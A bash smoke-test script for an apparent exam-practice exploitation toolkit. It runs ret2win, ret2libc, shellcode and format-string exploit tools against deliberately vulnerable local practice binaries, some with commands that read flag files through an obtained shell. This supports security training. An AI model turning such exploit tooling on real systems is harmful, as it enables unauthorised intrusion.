#!/usr/bin/env bash
# 60-second confidence check. Run this on exam morning; run selftest.sh (~20 min) when
# you have changed something. One target per major technique, nothing exhaustive.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; cd "$HERE"
PY=python3; FAILED=0; NOTES=0
note(){ printf '  \033[1;33m[note]\033[0m %s\n' "$*"; NOTES=1; }
ok(){  printf '  \033[1;32m[OK]\033[0m %s\n' "$*"; }
bad(){ printf '  \033[1;31m[FAIL]\033[0m %s\n' "$*"; FAILED=1; }
srv(){ "$PY" testbed/server.py "$HERE/testbed/$1" --port "$2" --cwd "$HERE/testbed" >/dev/null 2>&1 & echo $!; }
stop(){ kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
waitport(){ for _ in $(seq 1 60); do
    "$PY" -c "import socket,sys;s=socket.socket();s.settimeout(0.2);sys.exit(0 if s.connect_ex(('127.0.0.1',$1))==0 else 1)" 2>/dev/null && return 0
    sleep 0.1; done; bad "port $1 never came up"; return 1; }

echo "== toolkit smoke check =="
# FIRST: will the tools even start on THIS machine? Python version (3.12-only syntax is a
# SyntaxError on Debian 12's 3.11) and the external programs the analysis shells out to.
"$PY" compat.py > /tmp/bof_compat.log 2>&1 && ok "compat: python $("$PY" -c 'import sys;print(sys.version.split()[0])'), objdump/readelf/strings present" \
  || { cat /tmp/bof_compat.log; bad "compat.py - fix the lines above first"; }
for f in solve.py auto_pwn.py elftool.py verify.py ret2shell.py ret2libc.py fmtwrite.py flags.py; do
    "$PY" -c "import ast;ast.parse(open('$f').read())" 2>/dev/null || bad "$f does not parse"
done
ok "all tools parse"
# The practice clones are PRACTICE. The exam needs python and objdump, not a compiler, so
# a machine that cannot rebuild them (no gcc, no make, no 32-bit headers) is not a broken
# toolkit: use the prebuilt ones from the zip and say so, instead of "SOMETHING IS BROKEN".
if command -v gcc >/dev/null 2>&1 && command -v make >/dev/null 2>&1 \
     && (cd testbed && make all >/dev/null 2>&1); then
    ok "testbed builds"
elif [ -x testbed/varsrc ] && [ -x testbed/winarg64 ]; then
    note "cannot rebuild the practice clones here (no gcc/make or no 32-bit headers) - using the prebuilt ones; the exam does not need a compiler"
else
    note "no practice clones and no compiler: the live checks below are skipped. The tools themselves are checked above."
fi
# Can this machine RUN a 32-bit program at all? (No i386 loader = "No such file or
# directory" on a file that plainly exists.) If not, the 32-bit live checks cannot run
# here - which says nothing about a 32-bit REMOTE target: the tools only read the binary.
CAN32=1; CAN64=1
[ -n "${SMOKE_NO32:-}" ] && CAN32=0
# "Runs" means: starts and prints its banner. An exit code is not enough - a clone built
# on a newer distribution exits 1 with "version `GLIBC_2.38' not found" on Debian 12,
# which is exactly what the PREBUILT clones in the zip do there when they cannot be rebuilt.
runs(){ [ -x "$1" ] || return 1; o=$("$1" </dev/null 2>&1 | head -c 400); rc=$?
        case "$o" in *GLIBC_*|*"not found"*|*"cannot execute"*|*"No such file"*|"") return 1;; esac; return 0; }
runs testbed/menu32   || CAN32=0
runs testbed/winarg64 || CAN64=0
if [ $CAN64 = 0 ] && [ -x testbed/winarg64 ]; then
    note "the prebuilt clones do not run here (built against a newer libc than this machine has) and could not be rebuilt. Install gcc + gcc-multilib and run: make -C testbed clean all"
fi
[ $CAN32 = 1 ] || note "32-bit programs do not run on this machine (sudo apt install libc6-i386 to practise on them). Skipping the 32-bit live checks; a 32-bit EXAM target is unaffected."

# Works with or without 32-bit support: analysis of a 32-bit binary is static, and one
# 64-bit target is solved live.
"$PY" - <<'PYOFF' && ok "static analysis of 32- and 64-bit binaries (no execution needed)" || bad "static analysis"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap
from elftool import ELF
assert ap.frame_guard_plans("testbed/adjone32")[0][1] == b"A" * 40 + b"\x01\x00\x00\x00"
assert ELF("testbed/shellwin32").win_symbols.get("win") and ELF("testbed/winarg64").bits == 64
PYOFF
if [ $CAN64 = 1 ]; then
P=$(srv winarg64 24007); waitport 24007
timeout 60 "$PY" solve.py 127.0.0.1 24007 --binary testbed/winarg64 --run 2>/dev/null \
  | grep -q "SIT{" && ok "64-bit ret2win with an argument (one command)" || bad "64-bit live solve"
stop "$P"
fi
if [ $CAN32 = 1 ]; then

# one target per technique, offsets pinned so this stays fast
P=$(srv varsrc 24001); waitport 24001
timeout 40 "$PY" auto_pwn.py --host 127.0.0.1 --port 24001 --source testbed/src/varsrc.c \
  --goal var 2>/dev/null | grep -q "SIT{var_from_source}" && ok "var (guard from source)" || bad "var"
stop "$P"

P=$(srv menu32 24002); waitport 24002
timeout 40 "$PY" auto_pwn.py --host 127.0.0.1 --port 24002 --binary testbed/menu32 --goal ret2win \
  --offset 52 --talk 'Choice:=2' --talk 'Name:=PAYLOAD' 2>/dev/null \
  | grep -q "SIT{m3nu_n4v1g4t3d}" && ok "ret2win behind a menu (--talk)" || bad "menu/--talk"
stop "$P"

P=$(srv chatty_echo 24003); waitport 24003
timeout 60 "$PY" ret2shell.py --binary testbed/chatty_echo-pad --host 127.0.0.1 --port 24003 \
  --shift=-0x20 --cmd 'echo ===SHELL===; cat flags/chatty.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "SIT{chatty_echo_shift}" && ok "shellcode + build shift" || bad "ret2shell"
stop "$P"

P=$(srv ret2libc32 24004); waitport 24004
timeout 60 "$PY" ret2libc.py 127.0.0.1 24004 --binary testbed/ret2libc32 \
  --cmd 'echo ===SHELL===; cat flags/libc.txt' 2>/dev/null \
  | grep -q "SIT{r3t2l1bc_ch41n}" && ok "ret2libc (NX, no win)" || bad "ret2libc"
stop "$P"

P=$(srv fmtwrite32 24005); waitport 24005
timeout 60 "$PY" fmtwrite.py 127.0.0.1 24005 --addr-regex 'lives at (0x[0-9a-f]+)' \
  --value 0xDEADBEEF 2>/dev/null | grep -q "SIT{ex4ct_hn_wr1t3}" \
  && ok "format-string exact write" || bad "fmtwrite"
stop "$P"

P=$(srv menu32 24006); waitport 24006
timeout 20 "$PY" solve.py 127.0.0.1 24006 --binary testbed/menu32 >/dev/null 2>&1
[ $? = 3 ] && ok "triage refuses a menu fast (exit 3)" || bad "triage exit code"
stop "$P"

fi   # CAN32

echo
if [ "$FAILED" = 0 ] && [ "$NOTES" = 1 ]; then
    printf '\033[1;32mTOOLKIT OK\033[0m  (with notes above: they limit PRACTICE on this machine, not the exam)\n'; exit 0
fi
if [ "$FAILED" = 0 ]; then printf '\033[1;32mTOOLKIT OK\033[0m\n'; exit 0
else printf '\033[1;31mSOMETHING IS BROKEN - run selftest.sh for detail\033[0m\n'; exit 1; fi
